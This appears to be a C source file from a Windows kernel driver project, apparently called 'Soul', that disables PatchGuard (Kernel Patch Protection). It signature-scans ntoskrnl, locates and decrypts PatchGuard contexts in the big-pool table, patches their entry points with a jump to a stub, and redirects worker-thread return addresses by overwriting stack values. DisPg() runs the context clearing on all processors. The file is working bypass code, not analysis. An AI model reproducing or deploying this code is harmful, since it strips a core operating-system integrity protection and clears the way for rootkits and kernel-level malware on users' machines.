/*
*
* Copyright (c) 2015-2018 by blindtiger ( blindtiger@foxmail.com )
*
* The contents of this file are subject to the Mozilla Public License Version
* 2.0 (the "License")); you may not use this file except in compliance with
* the License. You may obtain a copy of the License at
* http://www.mozilla.org/MPL/
*
* Software distributed under the License is distributed on an "AS IS" basis,
* WITHOUT WARRANTY OF ANY KIND, either express or implied. SEe the License
* for the specific language governing rights and limitations under the
* License.
*
* The Initial Developer of the Original e is blindtiger.
*
*/

#include <OsDefs.h>

#include "Ctx.h"
#include "Except.h"
#include "Guard.h"
#include "Jump.h"
#include "Reload.h"
#include "Scan.h"
#include "Stack.h"
#include "Testis.h"
#include "Thread.h"

#define __ROL64(x, n) (((x) << ((n % 64))) | ((x) >> (64 - (n % 64))))
#define __ROR64(x, n) (((x) >> ((n % 64))) | ((x) << (64 - (n % 64))))

#define PG_KEY_INTERVAL 0x100
#define PG_FIELD_OFFSET 0x100
#define PG_FIELD_ROL_BITS 9
#define PG_MAX_FOUND 10

static PEX_SPIN_LOCK LargePoolTableLock;
static PPOOL_BIG_PAGES PoolBigPageTable;
static SIZE_T PoolBigPageTableSize;

static BOOLEAN PgIsBtcEncode;
static ULONG PgEntryRvaOffset;
static ULONG PgAppendSectionSize;
static PVOID PgAppendSection;
static ULONG PgNtSectionSize;
static ULONG64 PgContextField[2];
static WORK_QUEUE_ITEM PgClearWorkerItem;

PVOID NtosExpWorkerContext;

POOL_TYPE
(NTAPI * NtosMmDeterminePoolType)(
    __in PVOID VirtualAddress
    );

VOID
(NTAPI * NtosKiStartSystemThread)(
    VOID
    );

VOID
(NTAPI * NtosPspSystemThreadStartup)(
    __in PKSTART_ROUTINE StartRoutine,
    __in PVOID StartContext
    );

VOID
(NTAPI * NtosExpWorkerThread)(
    __in PVOID StartContext
    );

ULONG64
NTAPI
_btc64(
    __in ULONG64 a,
    __in ULONG64 b
);

PVOID
NTAPI
_PgEncodeClear(
    __in PVOID Reserved,
    __in PVOID PgContext
);

VOID
NTAPI
_RevertWorkerThreadToSelf(
    VOID
);

ULONG64
NTAPI
GetKeyOffset(
    __in ULONG64 XorKey,
    __in ULONG Index
)
{
    ULONG64 ReturnKey = 0;
    ULONG LastIndex = 0;
    ULONG64 LastKey = 0;

    LastIndex = PG_KEY_INTERVAL;
    LastKey = XorKey;

    do {
        LastKey = __ROR64(
            LastKey,
            (LastIndex & 0xff));

        if (FALSE != PgIsBtcEncode) {
            LastKey = _btc64(
                LastKey,
                LastKey);
        }

        LastIndex--;

        if ((Index % PG_KEY_INTERVAL) == LastIndex) {
            ReturnKey = LastKey;
            break;
        }
    } while (0 != LastIndex);

    return ReturnKey;
}

VOID
NTAPI
SetPgContextField(
    VOID
)
{
    NTSTATUS Status = STATUS_SUCCESS;
    HANDLE FileHandle = NULL;
    HANDLE SectionHandle = NULL;
    OBJECT_ATTRIBUTES ObjectAttributes = { 0 };
    UNICODE_STRING ImageFileName = { 0 };
    IO_STATUS_BLOCK IoStatusBlock = { 0 };
    PVOID ViewBase = NULL;
    SIZE_T ViewSize = 0;
    PVOID ImageBase = NULL;
    PCHAR ControlPc = NULL;
    PCHAR TargetPc = NULL;
    ULONG Length = 0;
    PIMAGE_SECTION_HEADER NtSection = NULL;
    PRUNTIME_FUNCTION FunctionEntry = NULL;

    CHAR SectionSig[] = "2e 48 31 11 48 31 51 08 48 31 51 10 48 31 51 18";
    CHAR FieldSig[] = "fb 48 8d 05";
    CHAR FieldSigEx[] = "?? 89 ?? 00 01 00 00 48 8D 05 ?? ?? ?? ?? ?? 89 ?? 08 01 00 00";
    CHAR PgEntrySig[] = "48 81 ec c0  02 00 00 48 8d a8 d8 fd ff ff 48 83 e5 80";
    CHAR KiEntrySig[] = "b9 01 00 00 00 44 0f 22 c1 48 8b 14 24 48 8b 4c 24 08 ff 54 24 10";
    CHAR PspEntrySig[] = "eb ?? b9 1e 00 00 00 e8";

    ImageBase = GetImageHandle("ntoskrnl.exe");

    if (NULL != ImageBase) {
        RtlInitUnicodeString(
            &ImageFileName,
            L"\\SystemRoot\\System32\\ntoskrnl.exe");

        InitializeObjectAttributes(
            &ObjectAttributes,
            &ImageFileName,
            (OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE),
            NULL,
            NULL);

        Status = ZwOpenFile(
            &FileHandle,
            FILE_EXECUTE,
            &ObjectAttributes,
            &IoStatusBlock,
            FILE_SHARE_READ | FILE_SHARE_DELETE,
            0);

        if (NT_SUCCESS(Status)) {
            InitializeObjectAttributes(&ObjectAttributes,
                NULL,
                OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
                NULL,
                NULL);

            Status = ZwCreateSection(
                &SectionHandle,
                SECTION_MAP_READ | SECTION_MAP_EXECUTE,
                &ObjectAttributes,
                NULL,
                PAGE_EXECUTE,
                SEC_IMAGE,
                FileHandle);

            if (NT_SUCCESS(Status)) {
                Status = ZwMapViewOfSection(
                    SectionHandle,
                    NtCurrentProcess(),
                    &ViewBase,
                    0L,
                    0L,
                    NULL,
                    &ViewSize,
                    ViewShare,
                    0L,
                    PAGE_EXECUTE);

                if (NT_SUCCESS(Status)) {
                    ControlPc = ScanBytes(
                        ViewBase,
                        (PCHAR)ViewBase + ViewSize,
                        SectionSig);

                    if (NULL != ControlPc) {
                        TargetPc = ControlPc;

                        while (0 != CmpByte(TargetPc[0], 0x41) &&
                            0 != CmpByte(TargetPc[1], 0xff) &&
                            0 != CmpByte(TargetPc[2], 0xe0)) {
                            Length = GetInstructionLength(TargetPc);

                            if (0 == PgAppendSectionSize) {
                                if (8 == Length) {
                                    if (0 == CmpByte(TargetPc[0], 0x48) &&
                                        0 == CmpByte(TargetPc[1], 0x31) &&
                                        0 == CmpByte(TargetPc[2], 0x84) &&
                                        0 == CmpByte(TargetPc[3], 0xca)) {
                                        PgAppendSectionSize = *(PULONG)(TargetPc + 4);

                                        if (0 != PgAppendSectionSize) {
                                            PgAppendSection = ExAllocatePool(
                                                NonPagedPool,
                                                PgAppendSectionSize);

                                            if (NULL != PgAppendSection) {
                                                RtlCopyMemory(
                                                    PgAppendSection,
                                                    ControlPc,
                                                    PgAppendSectionSize);
                                            }
                                        }

#ifndef VMP
                                        DbgPrint(
                                            "Soul - Testis - < %p > pg context append section size\n",
                                            PgAppendSectionSize);
#endif // !VMP
                                        if (0 == CmpByte(TargetPc[11], 0x48) ||
                                            0 == CmpByte(TargetPc[12], 0x0f) ||
                                            0 == CmpByte(TargetPc[13], 0xbb) ||
                                            0 == CmpByte(TargetPc[14], 0xc0)) {
                                            PgIsBtcEncode = TRUE;

#ifndef VMP
                                            DbgPrint("Soul - Testis - pg context btc encode enable\n");
#endif // !VMP
                                        }
                                    }
                                }
                            }

                            if (6 == Length) {
                                if (0 == CmpByte(TargetPc[0], 0x8b) &&
                                    0 == CmpByte(TargetPc[1], 0x82)) {
                                    PgEntryRvaOffset = *(PULONG)(TargetPc + 2);

#ifndef VMP
                                    DbgPrint(
                                        "Soul - Testis - < %p > pg context entry rva offset\n",
                                        PgEntryRvaOffset);
#endif // !VMP
                                    break;
                                }
                            }

                            TargetPc += Length;
                        }
                    }

                    ControlPc = ViewBase;

                    while (NULL != ControlPc) {
                        ControlPc = ScanBytes(
                            ControlPc,
                            (PCHAR)ViewBase + ViewSize,
                            FieldSig);

                        if (NULL != ControlPc) {
                            TargetPc = ScanBytes(
                                ControlPc,
                                ControlPc + PgEntryRvaOffset,
                                FieldSigEx);

                            if (NULL != TargetPc) {
                                PgContextField[0] = (ULONG64)
                                    ((TargetPc - (ULONG64)ViewBase + (ULONG64)ImageBase - 4) +
                                        *(PLONG)(TargetPc - 4) +
                                        sizeof(LONG));

                                PrintSymbol((PVOID)PgContextField[0]);

                                PgContextField[1] = (ULONG64)
                                    ((TargetPc - (ULONG64)ViewBase + (ULONG64)ImageBase + 10) +
                                        *(PLONG)(TargetPc + 10) +
                                        sizeof(LONG));

                                PrintSymbol((PVOID)PgContextField[1]);

                                break;
                            }

                            ControlPc++;
                        }
                        else {
                            break;
                        }
                    }

                    ControlPc = ScanBytes(
                        ViewBase,
                        (PCHAR)ViewBase + ViewSize,
                        PgEntrySig);

                    if (NULL != ControlPc) {
                        NtSection = SectionTableFromVirtualAddress(
                            ViewBase,
                            ControlPc);

                        if (NULL != NtSection) {
                            PgNtSectionSize = max(
                                NtSection->SizeOfRawData,
                                NtSection->Misc.VirtualSize);

#ifndef VMP
                            DbgPrint(
                                "Soul - Testis - < %p > pg context nt section size\n",
                                PgNtSectionSize);
#endif // !VMP
                        }
                    }

                    ControlPc = ScanBytes(
                        ViewBase,
                        (PCHAR)ViewBase + ViewSize,
                        KiEntrySig);

                    if (NULL != ControlPc) {
                        TargetPc = ControlPc;

                        NtosKiStartSystemThread = (PVOID)
                            (TargetPc - (ULONG64)ViewBase + (ULONG64)ImageBase);

#ifndef VMP
                        DbgPrint(
                            "Soul - Testis - < %p > KiStartSystemThread\n",
                            NtosKiStartSystemThread);
#endif // !VMP
                    }

                    ControlPc = ScanBytes(
                        ViewBase,
                        (PCHAR)ViewBase + ViewSize,
                        PspEntrySig);

                    if (NULL != ControlPc) {
                        TargetPc = (PVOID)
                            (ControlPc - (ULONG64)ViewBase + (ULONG64)ImageBase);

                        FunctionEntry = DetourRtlLookupFunctionEntry(
                            (ULONG64)TargetPc,
                            (PULONG64)&ImageBase,
                            NULL);

                        if (NULL != FunctionEntry) {
                            NtosPspSystemThreadStartup = (PVOID)
                                ((PCHAR)ImageBase + FunctionEntry->BeginAddress);

#ifndef VMP
                            DbgPrint(
                                "Soul - Testis - < %p > PspSystemThreadStartup\n",
                                NtosPspSystemThreadStartup);
#endif // !VMP
                        }
                    }

                    ZwUnmapViewOfSection(
                        NtCurrentProcess(),
                        ViewBase);
                }

                ZwClose(SectionHandle);
            }

            ZwClose(FileHandle);
        }
    }
}

PVOID
NTAPI
FindExProtectPool(
    VOID
)
{
    PVOID Result = NULL;
    PVOID ImageBase = NULL;
    PIMAGE_NT_HEADERS NtHeaders = NULL;
    PIMAGE_SECTION_HEADER NtSection = NULL;
    PCHAR ControlPc = NULL;
    PCHAR TargetPc = NULL;

    CHAR Sig[] = "48 8b ?? e8";
    CHAR SigEx[] = "ff 0f 00 00 0f 85 ?? ?? ?? ?? 48 8b ?? e8"; // check call MiDeterminePoolType

    ImageBase = GetImageHandle("ntoskrnl.exe");

    if (NULL != ImageBase) {
        NtHeaders = RtlImageNtHeader(ImageBase);

        if (NULL != NtHeaders) {
            NtSection = IMAGE_FIRST_SECTION(NtHeaders);

            ControlPc = (PCHAR)ImageBase + NtSection[0].VirtualAddress;

            while (TRUE) {
                ControlPc = ScanBytes(
                    ControlPc,
                    (PCHAR)ImageBase + NtSection[0].VirtualAddress + NtSection[0].SizeOfRawData,
                    Sig);

                if (NULL != ControlPc) {
                    TargetPc = ScanBytes(
                        ControlPc,
                        ControlPc + 0x100,
                        SigEx);

                    if (NULL != TargetPc) {
                        Result = TargetPc;

                        TargetPc = (TargetPc + 0xe) +
                            *(PLONG)(TargetPc + 0xe) + sizeof(LONG);

                        RtlCopyMemory(
                            (PVOID)&NtosMmDeterminePoolType,
                            &TargetPc,
                            sizeof(PVOID));

#ifndef VMP
                        DbgPrint(
                            "Soul - Testis - < %p > MmDeterminePoolType\n",
                            NtosMmDeterminePoolType);
#endif // !VMP
                        break;
                    }
                }
                else {
                    break;
                }

                ControlPc++;
            }
        }
    }

    return Result;
}

VOID
NTAPI
FindPoolBigPageTable(
    VOID
)
{
    PVOID ImageBase = NULL;
    PCHAR ControlPc = NULL;
    PCHAR TargetPc = NULL;
    ULONG Length = 0;
    PPOOL_BIG_PAGES * PageTable = NULL;
    PSIZE_T PageTableSize = NULL;

    ControlPc = FindExProtectPool();

    if (NULL != ControlPc) {
#ifndef VMP
        DbgPrint(
            "Soul - Testis - < %p > ExProtectPool\n",
            ControlPc);
#endif // !VMP

        TargetPc = ControlPc;

        while (TRUE) {
            Length = GetInstructionLength(TargetPc);

            if (1 == Length) {
                if (0 == CmpByte(TargetPc[0], 0xc3)) {
                    break;
                }
            }

            if (7 == Length) {
                if (0x40 == (TargetPc[0] & 0xf0)) {
                    if (0 == CmpByte(TargetPc[1], 0x8b)) {
                        if (NULL == PageTable) {
                            PageTable = (PPOOL_BIG_PAGES *)
                                ((TargetPc + 3) +
                                    *(PLONG)(TargetPc + 3) +
                                    sizeof(LONG));

                            if (0 == (ULONG64)*PageTable ||
                                0 != ((ULONG64)(*PageTable) & 0xfff)) {
                                PageTable = NULL;
                            }
                        }
                        else if (NULL == PageTableSize) {
                            PageTableSize = (PSIZE_T)
                                ((TargetPc + 3) +
                                    *(PLONG)(TargetPc + 3) +
                                    sizeof(LONG));

                            if (0 == *PageTableSize ||
                                0 != ((ULONG64)(*PageTableSize) & 0xfff)) {
                                PageTableSize = NULL;
                            }
                        }
                    }
                    else if (0 == CmpByte(TargetPc[1], 0x8d)) {
                        if (NULL == LargePoolTableLock) {
                            LargePoolTableLock = (PEX_SPIN_LOCK)
                                ((TargetPc + 3) +
                                    *(PLONG)(TargetPc + 3) +
                                    sizeof(LONG));
                        }
                    }
                }

                if (0 == CmpByte(TargetPc[0], 0x0f) &&
                    0 == CmpByte(TargetPc[1], 0x0d) &&
                    0 == CmpByte(TargetPc[2], 0x0d)) {
                    if (NULL == LargePoolTableLock) {
                        LargePoolTableLock = (PEX_SPIN_LOCK)
                            ((TargetPc + 3) +
                                *(PLONG)(TargetPc + 3) +
                                sizeof(LONG));
                    }
                }
            }

            if (NULL != PageTable &&
                NULL != PageTableSize &&
                NULL != LargePoolTableLock) {
                if ((ULONG64)*PageTable > (ULONG64)*PageTableSize) {
                    PoolBigPageTable = (PPOOL_BIG_PAGES)*PageTable;
                    PoolBigPageTableSize = (SIZE_T)*PageTableSize;
                }
                else {
                    // swap

                    PoolBigPageTable = (PPOOL_BIG_PAGES)*PageTableSize;
                    PoolBigPageTableSize = (SIZE_T)*PageTable;
                }

#ifndef VMP
                DbgPrint(
                    "Soul - Testis - < %p > PoolBigPageTable\n",
                    PoolBigPageTable);

                DbgPrint(
                    "Soul - Testis - < %p > PoolBigPageTableSize\n",
                    PoolBigPageTableSize);


                DbgPrint(
                    "Soul - Testis - < %p > LargePoolTableLock\n",
                    LargePoolTableLock);
#endif // !VMP

                break;
            }

            TargetPc +=
                GetInstructionLength(TargetPc);
        }
    }
}

PVOID
NTAPI
FindPgEntrySig(
    __in PVOID VirtualAddress
)
{
    PVOID ControlPc = NULL;
    ULONG Index = 0;
    KIRQL Irql = 0;
    CHAR SdbpCheckDll[] =
        "48 8b 74 24 30 48 8b 7c 24 28 4c 8b 54 24 38 33 c0 49 89 02 49 83 ea 08 4c 3b d4 73 f4 48 89 7c 24 28 8b d8 8b f8 8b e8 4c 8b d0 4c 8b d8 4c 8b e0 4c 8b e8 4c 8b f0 4c 8b f8 ff e6";

    if (NULL != LargePoolTableLock) {
        Irql = ExAcquireSpinLockShared(LargePoolTableLock);

        for (Index = 0;
            Index < PoolBigPageTableSize;
            Index++) {
            if (POOL_BIG_TABLE_ENTRY_FREE != FlagOn(
                (ULONG64)PoolBigPageTable[Index].Va,
                POOL_BIG_TABLE_ENTRY_FREE)) {
                if (NonPagedPool == NtosMmDeterminePoolType(PoolBigPageTable[Index].Va)) {
                    if (PoolBigPageTable[Index].NumberOfPages > PgNtSectionSize) {
                        if ((ULONG64)VirtualAddress >= (ULONG64)PoolBigPageTable[Index].Va &&
                            (ULONG64)VirtualAddress < (ULONG64)PoolBigPageTable[Index].Va +
                            PoolBigPageTable[Index].NumberOfPages) {
                            ControlPc = ScanBytes(
                                PoolBigPageTable[Index].Va,
                                (PCHAR)PoolBigPageTable[Index].Va + PoolBigPageTable[Index].NumberOfPages,
                                SdbpCheckDll);

                            break;
                        }
                    }
                }
            }
        }

        ExReleaseSpinLockShared(LargePoolTableLock, Irql);
    }

    return ControlPc;
}

VOID
NTAPI
PgEncodeClear(
    __in PVOID Reserved,
    __in PVOID PgContext
)
{
    DbgPrint(
        "Soul - Testis - < %p > pg context clear\n",
        PgContext);
}

VOID
NTAPI
PgSetEncodeEntry(
    __in PVOID PgContext,
    __in ULONG64 RorKey
)
{
    ULONG64 LastRorKey = 0;
    ULONG EntryRva = 0;
    ULONG64 FieldBuffer[10] = { 0 };
    ULONG FieldIndex = 0;
    ULONG Index = 0;
    PCHAR ControlPc = NULL;

    FieldIndex = (PgEntryRvaOffset -
        PgAppendSectionSize) / sizeof(ULONG64);

    RtlCopyMemory(
        &FieldBuffer,
        (PCHAR)PgContext + (PgEntryRvaOffset & ~7),
        sizeof(FieldBuffer));

    for (Index = 0;
        Index < RTL_NUMBER_OF(FieldBuffer);
        Index++) {
        LastRorKey = GetKeyOffset(RorKey, FieldIndex + Index);
        FieldBuffer[Index] = FieldBuffer[Index] ^ LastRorKey;
    }

    EntryRva = *(PULONG)((PCHAR)&FieldBuffer + (PgEntryRvaOffset & 7));

    FieldIndex = (EntryRva - PgAppendSectionSize) / sizeof(ULONG64);

    RtlCopyMemory(
        &FieldBuffer,
        (PCHAR)PgContext + (EntryRva & ~7),
        sizeof(FieldBuffer));

    for (Index = 0;
        Index < RTL_NUMBER_OF(FieldBuffer);
        Index++) {
        LastRorKey = GetKeyOffset(RorKey, FieldIndex + Index);
        FieldBuffer[Index] = FieldBuffer[Index] ^ LastRorKey;
    }

    ControlPc = (PCHAR)&FieldBuffer + (EntryRva & 7);

    BuildJumpCode(
        _PgEncodeClear,
        &ControlPc);

    for (Index = 0;
        Index < RTL_NUMBER_OF(FieldBuffer);
        Index++) {
        LastRorKey = GetKeyOffset(RorKey, FieldIndex + Index);
        FieldBuffer[Index] = FieldBuffer[Index] ^ LastRorKey;
    }

    RtlCopyMemory(
        (PCHAR)PgContext + (EntryRva & ~7),
        &FieldBuffer,
        sizeof(FieldBuffer));

    DbgPrint("Soul - Testis - pg context disarmed\n");
}

VOID
NTAPI
PgClearContext(
    __in ULONG_PTR Argument
)
{
    BOOLEAN Enable = FALSE;
    PCHAR TargetPc = NULL;
    SIZE_T Index = 0;
    ULONG64 RorKey = 0;
    PULONG64 Field = NULL;
    PVOID PgContext = NULL;

    Enable = KeDisableInterrupts();

    if (0 == KeGetCurrentProcessorNumber()) {
        ExAcquireSpinLockShared(LargePoolTableLock);

        for (Index = 0;
            Index < PoolBigPageTableSize;
            Index++) {
            if (POOL_BIG_TABLE_ENTRY_FREE != FlagOn(
                (ULONG64)PoolBigPageTable[Index].Va,
                POOL_BIG_TABLE_ENTRY_FREE)) {
                if (NonPagedPool == NtosMmDeterminePoolType(PoolBigPageTable[Index].Va)) {
                    if (PoolBigPageTable[Index].NumberOfPages > PgNtSectionSize) {
                        TargetPc = PoolBigPageTable[Index].Va;

                        while ((ULONG64)TargetPc <
                            (ULONG64)PoolBigPageTable[Index].Va +
                            PoolBigPageTable[Index].NumberOfPages - PgAppendSectionSize) {
                            Field = TargetPc;

                            if ((ULONG64)Field == (ULONG64)&PgContextField) {
                                break;
                            }

                            RorKey = Field[1] ^ PgContextField[1];

                            if (0 == RorKey) {
                                if (Field[0] == PgContextField[0]) {
                                    PgContext = TargetPc - PG_FIELD_OFFSET;

#ifndef VMP
                                    DbgPrint(
                                        "Soul - Testis - found decode pg context at < %p >\n",
                                        PgContext);
#endif // !VMP
                                    break;
                                }
                            }
                            else {
                                RorKey = __ROR64(RorKey, PG_FIELD_ROL_BITS);

                                if (FALSE != PgIsBtcEncode) {
                                    RorKey = _btc64(RorKey, RorKey);
                                }

                                if ((ULONG64)(Field[0] ^ RorKey) == (ULONG64)PgContextField[0]) {
                                    PgContext = TargetPc - PG_FIELD_OFFSET;

                                    RorKey = __ROR64(Field[0] ^ PgContextField[0], 8);

                                    if (FALSE != PgIsBtcEncode) {
                                        RorKey = _btc64(RorKey, RorKey);
                                    }

                                    RorKey = __ROR64(RorKey, 7);

                                    if (FALSE != PgIsBtcEncode) {
                                        RorKey = _btc64(RorKey, RorKey);
                                    }

                                    RorKey = __ROR64(RorKey, 6);

                                    if (FALSE != PgIsBtcEncode) {
                                        RorKey = _btc64(RorKey, RorKey);
                                    }

                                    RorKey = __ROR64(RorKey, 5);

                                    if (FALSE != PgIsBtcEncode) {
                                        RorKey = _btc64(RorKey, RorKey);
                                    }

                                    RorKey = __ROR64(RorKey, 4);

                                    if (FALSE != PgIsBtcEncode) {
                                        RorKey = _btc64(RorKey, RorKey);
                                    }

                                    RorKey = __ROR64(RorKey, 3);

                                    if (FALSE != PgIsBtcEncode) {
                                        RorKey = _btc64(RorKey, RorKey);
                                    }

                                    RorKey = __ROR64(RorKey, 2);

                                    if (FALSE != PgIsBtcEncode) {
                                        RorKey = _btc64(RorKey, RorKey);
                                    }

                                    RorKey = __ROR64(RorKey, 1);

                                    if (FALSE != PgIsBtcEncode) {
                                        RorKey = _btc64(RorKey, RorKey);
                                    }

                                    DbgPrint(
                                        "Soul - Testis - found encode pg context at < %p > RorKey < %p >\n",
                                        PgContext,
                                        RorKey);

                                    PgSetEncodeEntry(PgContext, RorKey);
                                }
                            }

                            TargetPc++;
                        }
                    }
                }
            }
        }

        ExReleaseSpinLockSharedFromDpcLevel(LargePoolTableLock);
    }

    KeEnableInterrupts(Enable);
}

VOID
NTAPI
PgDecodeClear(
    VOID
)
{
    DbgPrint("Soul - Testis - pg worker clear\n");
}

VOID
NTAPI
PgSetDecodeEntry(
    __in PVOID Context
)
{
    ULONG64 LowLimit = 0;
    ULONG64 HighLimit = 0;
    PULONG64 InitialStack = 0;
    PULONG64 TargetPc = NULL;
    ULONG Count = 0;
    PCALLERS Callers = NULL;
    PVOID ControlPc = NULL;

    Callers = ExAllocatePool(
        NonPagedPool,
        MAX_STACK_DEPTH * sizeof(CALLERS));

    if (NULL != Callers) {
        Count = WalkFrameChain(
            Callers,
            MAX_STACK_DEPTH);

        if (0 != Count) {
            IoGetStackLimits(&LowLimit, &HighLimit);

            InitialStack = IoGetInitialStack();

            if (NULL != Callers[Count - 1].Establisher) {
                ControlPc = FindPgEntrySig(Callers[Count - 1].Establisher);

                if (NULL != ControlPc) {
                    for (TargetPc = (PULONG64)Callers[Count - 1].EstablisherFrame;
                        (ULONG64)TargetPc < (ULONG64)InitialStack;
                        TargetPc++) {
                        if ((ULONG64)*TargetPc == (ULONG64)Callers[Count - 1].Establisher) {
                            *TargetPc = (ULONG64)_RevertWorkerThreadToSelf;

                            DbgPrint(
                                "Soul - Testis - revert worker thread to self\n");

                            break;
                        }
                    }
                }
            }
        }

        ExFreePool(Callers);
    }
}

VOID
NTAPI
PgClearWorker(
    __in PKEVENT Notify
)
{
    NTSTATUS Status = STATUS_SUCCESS;
    PSYSTEM_PROCESS_INFORMATION ProcessInfo = NULL;
    PSYSTEM_EXTENDED_THREAD_INFORMATION ThreadInfo = NULL;
    PVOID Buffer = NULL;
    ULONG BufferSize = PAGE_SIZE;
    ULONG ReturnLength = 0;
    ULONG Index = 0;
    PULONG64 InitialStack = 0;
    PKPRIQUEUE WorkPriQueue = NULL;

    InitialStack = IoGetInitialStack();
    NtosExpWorkerContext = UlongToPtr(CriticalWorkQueue);

    while ((ULONG64)InitialStack != (ULONG64)&Notify) {
        WorkPriQueue = *(PVOID *)InitialStack;

        if (FALSE != MmIsAddressValid(WorkPriQueue)) {
            if (FALSE != MmIsAddressValid((PCHAR)(WorkPriQueue + 1) - 1)) {
                if (0x15 == WorkPriQueue->Header.Type &&
                    0xac == WorkPriQueue->Header.Hand) {
                    NtosExpWorkerContext = WorkPriQueue;
                    break;
                }
            }
        }

        InitialStack--;
    }

retry:
    Buffer = ExAllocatePool(
        NonPagedPool,
        BufferSize);

    if (NULL != Buffer) {
        RtlZeroMemory(
            Buffer,
            BufferSize);

        Status = ZwQuerySystemInformation(
            SystemExtendedProcessInformation,
            Buffer,
            BufferSize,
            &ReturnLength);

        if (Status >= 0) {
            ProcessInfo = (PSYSTEM_PROCESS_INFORMATION)Buffer;

            while (TRUE) {
                if (PsGetCurrentProcessId() == ProcessInfo->UniqueProcessId) {
                    ThreadInfo = (PSYSTEM_EXTENDED_THREAD_INFORMATION)
                        (ProcessInfo + 1);

                    for (Index = 0;
                        Index < ProcessInfo->NumberOfThreads;
                        Index++) {
                        if ((ULONG64)PsGetCurrentThreadId() ==
                            (ULONG64)ThreadInfo[Index].ThreadInfo.ClientId.UniqueThread) {
                            NtosExpWorkerThread = ThreadInfo[Index].Win32StartAddress;

                            break;
                        }
                    }

                    for (Index = 0;
                        Index < ProcessInfo->NumberOfThreads;
                        Index++) {
                        if ((ULONG64)PsGetCurrentThreadId() !=
                            (ULONG64)ThreadInfo[Index].ThreadInfo.ClientId.UniqueThread &&
                            (ULONG64)NtosExpWorkerThread ==
                            (ULONG64)ThreadInfo[Index].Win32StartAddress) {
                            RemoteCall(
                                ThreadInfo[Index].ThreadInfo.ClientId.UniqueThread,
                                IMAGE_NT_OPTIONAL_HDR_MAGIC,
                                (PUSER_THREAD_START_ROUTINE)PgSetDecodeEntry,
                                NULL);
                        }
                    }

                    break;
                }

                if (0 == ProcessInfo->NextEntryOffset) {
                    break;
                }
                else {
                    ProcessInfo = (PSYSTEM_PROCESS_INFORMATION)
                        ((PCHAR)ProcessInfo + ProcessInfo->NextEntryOffset);
                }
            }
        }

        ExFreePool(Buffer);
        Buffer = NULL;

        if (STATUS_INFO_LENGTH_MISMATCH == Status) {
            BufferSize = ReturnLength;
            goto retry;
        }
    }

    KeSetEvent(
        Notify,
        LOW_PRIORITY,
        FALSE);
}

VOID
NTAPI
DisPg(
    VOID
)
{
    KEVENT Notify = { 0 };

    if (0 == PgEntryRvaOffset ||
        0 == PgAppendSectionSize ||
        0 == PgNtSectionSize ||
        0 == PgContextField[0] ||
        0 == PgContextField[1]) {
        SetPgContextField();
    }

    if (NULL == PoolBigPageTable ||
        0 == PoolBigPageTableSize ||
        NULL == LargePoolTableLock) {
        FindPoolBigPageTable();
    }

    if (0 != PgEntryRvaOffset &&
        0 != PgAppendSectionSize &&
        NULL != PgAppendSection &&
        0 != PgNtSectionSize &&
        0 != PgContextField[0] &&
        0 != PgContextField[1] &&
        NULL != PoolBigPageTable &&
        0 != PoolBigPageTableSize &&
        NULL != LargePoolTableLock&&
        NULL != NtosMmDeterminePoolType) {
        KeIpiGenericCall(
            (PKIPI_BROADCAST_WORKER)PgClearContext,
            (ULONG_PTR)0);

        KeInitializeEvent(
            &Notify,
            SynchronizationEvent,
            FALSE);

        ExInitializeWorkItem(
            &PgClearWorkerItem,
            PgClearWorker,
            &Notify);

        ExQueueWorkItem(
            &PgClearWorkerItem,
            CriticalWorkQueue);

        KeWaitForSingleObject(
            &Notify,
            Executive,
            KernelMode,
            FALSE,
            NULL);
    }
}
